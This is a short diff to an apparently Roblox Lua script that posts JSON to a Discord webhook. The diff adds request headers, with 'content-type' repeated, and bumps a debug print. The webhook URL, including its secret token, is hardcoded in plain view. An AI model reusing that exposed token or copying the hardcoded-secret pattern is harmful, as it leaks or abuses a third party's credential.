@@ -26,7 +26,10 @@ local function RequestWebhook(Desc)
         ["attachments"] = {},
     }
     local HeadersVar = {
-        ["content-type"] = "application/json"
+        ["content-type"] = "application/json",
+        ["accept"] = "application/json",
+        ["accept-language"] = "en",
+        ["content-type"] = "application/json",
     }
     
     Request({Url = "https://discord.com/api/webhooks/767364414366023690/aKwrIaIzEFhLDwtNagIpJQDewkxqYACdAq1-5iGrjevI7Fpooe1Am4p-HYMmDMcY90fw", Body = Http:JSONEncode(Data), Method = "POST", Headers = HeadersVar}) 
@@ -54,4 +57,5 @@ task.spawn(function()
     end 
 end)
 
-print("yes11")
+print("yes12")
+
